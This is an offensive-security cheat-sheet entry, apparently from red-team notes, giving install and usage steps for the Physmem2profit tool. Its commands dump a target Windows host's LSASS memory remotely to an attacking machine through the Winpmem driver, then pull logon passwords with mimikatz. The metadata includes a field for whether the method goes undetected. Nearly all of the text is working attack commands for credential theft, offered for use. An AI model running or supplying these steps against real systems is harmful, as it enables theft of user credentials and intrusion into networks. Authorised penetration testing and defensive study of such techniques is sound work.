
## Installation
1. Clone the Physmem2profit Git repository:
> git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
2. For the server running on the target computer: Build physmem2profit/server/Physmem2profit.sln with Visual Studio
3. For the client running on the attacking machine:
> bash physmem2profit/client/install.sh

## [[LSASS dumping]]
1. Run on the target as admin
> physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]
2. You can download the signed Winpmem driver [here](https://github.com/Velocidex/WinPmem/raw/master/kernel/binaries/winpmem_x64.sys). This driver needs to be present on the target host.
3. Run on the attacking machine. This command will activate the virtualenv created by install.sh.
> source physmem2profit/client/.env/bin/activate 
4. Run on the attacking machine
> cd physmem2profit/client and python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]
- physmem2profit.exe needs to be running on the target machine before you run this command.
- This will write the LSASS minidump to output/[label]-[date]-lsass.dmp on the attacking machine.
5. Copy the minidump to a Windows system and run mimikatz
> mimikatz.exe "sekurlsa::minidump [label]-[date]-lsass.dmp" "sekurlsa::logonpasswords" "exit"


```meta
requirements: admin
results: 
category: 
oss: #win
source: https://github.com/FSecureLABS/physmem2profit
description: Used to create a minidump of a target hosts' LSASS process by analysing physical memory remotely
undetected: 
```